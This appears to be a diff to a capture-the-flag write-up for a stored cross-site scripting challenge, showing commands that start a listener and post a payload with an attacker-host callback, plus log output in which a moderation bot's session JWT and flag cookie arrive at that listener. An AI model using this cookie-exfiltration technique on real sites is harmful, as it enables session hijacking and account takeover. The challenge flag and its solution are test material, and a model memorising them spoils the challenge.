@@ -30,17 +30,19 @@ python3 xss-listener.py &        # start listener
 ./post-payload.sh http://localhost:4942 bbeo32ucx0a65b8 <attacker_host>:8888 cookies_jdoe.txt
 ```
 
+`hits.log` is created in the current working directory; stop the listener
+with `kill %1`.
+
 Within ~2 minutes the moderation bot visits the thread, executes the payload,
-and the listener receives:
+and the listener appends one line per hit to `hits.log`:
 
 ```
-GET /xss-hit?c=session%3D<jwt>%3B%20flag%3DFLAG%7Bxss_st0r3d_1s_n0t_4_f34tur3_w1l%7D
-User-Agent: Mozilla/5.0 ... HeadlessChrome/120.0.6099.28 ...
-Origin: http://127.0.0.1:4942
+2026-10-21 14:03:22.123456 GET /xss-hit?c=session=<jwt>; flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l} from 127.0.0.1 headers={'Host': '<attacker_host>:8888', 'User-Agent': 'Mozilla/5.0 ... HeadlessChrome/120.0.6099.28 ...', 'Origin': 'http://127.0.0.1:4942'}
 ```
 
-Decoded cookies: `flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}` plus a
-`session` JWT (`login: moderator`).
+`hits.log` lines are already URL-decoded by the listener, so the exfiltrated
+cookies — the `flag` cookie and the bot's `session` JWT (`login: moderator`) —
+are readable as-is in the log.
 
 Note: the bot requests the app via `http://127.0.0.1:4942` (loopback) —
 it runs server-side, inside the VM itself. That is what makes the follow-up
